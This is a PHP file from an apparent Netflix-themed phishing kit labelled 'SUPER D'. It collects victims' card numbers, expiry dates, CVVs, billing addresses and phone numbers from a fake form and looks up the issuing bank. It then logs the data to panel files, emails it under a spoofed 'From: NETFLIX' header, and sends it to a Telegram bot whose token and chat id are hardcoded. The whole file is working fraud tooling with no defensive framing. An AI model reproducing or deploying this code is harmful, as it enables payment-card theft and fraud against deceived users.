﻿<?php 
/*
SUPER D
*/
@ini_set('display_errors', 'on');
require 'detect.php';
include "../../config.php";
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();

$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$ctp=$_POST['ctp'];$ccn=str_replace(' ','',$_POST['cnm']);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$x2 = $_POST['cnm'];$bin = $_POST['cnm'] ;$bin = preg_replace('/\s/', '', $bin);$bin = substr($bin,0,8);$url = "https://lookup.binlist.net/".$bin;
$headers = array();$headers[] = 'Accept-Version: 3';
$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);$resp=curl_exec($ch);curl_close($ch);$xBIN = json_decode($resp, true);$_SESSION['bank_name'] = $xBIN["bank"]["name"];$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);$_SESSION['bank_type'] = strtoupper($xBIN["type"]);$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);$bnk = $_SESSION['bank_name'];
$msg= '
[☡] -------. CC 💰------- [☡]
[💰] Card Name [💰] = '.$fnm.'
[💰] CC Number [💰] = '.$ccn.'
[💰] CC Date [💰]   = '.$cex.'
[💰] CC CVV [💰]    = '.$csc.'
[☡] ------- 🥷Billing info 🥷 ------- [☡]
[📓] Adresse [📓]  = '.$adr.'
[📓] City 🌃 [📓]  = '.$cty.'
[📓] Postal Code [📓] ='.$zip.'
[📓] State [📓]   = '.$stt.'
[📓] Country [📓] = '.$cnt.'
[📓] Phone 📞[📓] = '.$phn.'
[📓] Bank Name [📓]  = '.$_SESSION['bank_name'].' 
[📓] Type  [📓]  = '.$_SESSION['bank_type'].' 
[📓] Brand  [📓] = '.$_SESSION['bank_brand'].'
[📓] Card  [📓]  = '.$ctp.'
[☡] ------- [#𝙲𝙺𝚁] ------- [☡]';

$msghtb = '
<tr>
<td width="80">
<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/16.png">' .$IP.'</td>
<td width="40">
<p align="center">'.$fnm.'</th>
<td width="60">
<p align="center">'.$adr.'</td>
<td width="40">
<p align="center">'.$cty.'</td>
<td width="20">
<p align="center">'.$zip.'</td>
<td width="40">
<p align="center">'.$stt.'</td>
<td width="40">
<p align="center">'.$cnt.'</td>
<td width="20">
<p align="center">'.$phn.'</td>
<td width="60">
<p align="center">'.$times.' / '.$date.'</td>
</font></td></tr>';
			
$msghtc = '
<tr>
<td width="80">
<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">   ' .$IP.'</td>
<td width="20">
<p align="center"><code>'.$ctp.'</code></td>
<td width="40">
<p align="center">'.$fnm.'</th>
<td width="60">
<p align="center">'.$ccn.'</td>
<td width="20">
<p align="center">'.$cex.'</td>
<td width="10">
<p align="center">'.$csc.'</td>
<td width="40">
<p align="center">'.$_SESSION['bank_type'].'</td>
<td width="40">
<p align="center">'.$_SESSION['bank_brand'].'</td>
<td width="20">
<p align="center">'.$_SESSION['bank_name'].'</td>
<td width="60">
<p align="center">'.$times.' / '.$date.'</td>
</font></td></tr>';
$save=fopen("../panel/bill".$namerand.".html", "a+");fwrite($save,$msghtb);fclose($save);$save2=fopen("../panel/cc".$namerand.".html", "a+");fwrite($save2,$msghtc);fclose($save2);
$subject  = " [ NETFLIX BILL & CC ] / ".$IP." / Super 'D' ";$headers = "From: NETFLIX \r\n";mail($yourmail, $subject, $msg, $headers);$last = substr($x2,-4);$_SESSION['ctype']=$ctp;$_SESSION['fnm']=$fnm;$_SESSION['last']=$last;$_SESSION['bnk']=$bnk;$lastph = substr($phn,-4);$_SESSION['lastph']=$lastph;
include("authentication.php");
    $token = "6495564868:AAGWyZjefsbU-uDi5jdX1fqFmyIy8d32fZE";
    $data = [
    'text' => $msg,
    'chat_id' => '637855559',
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>
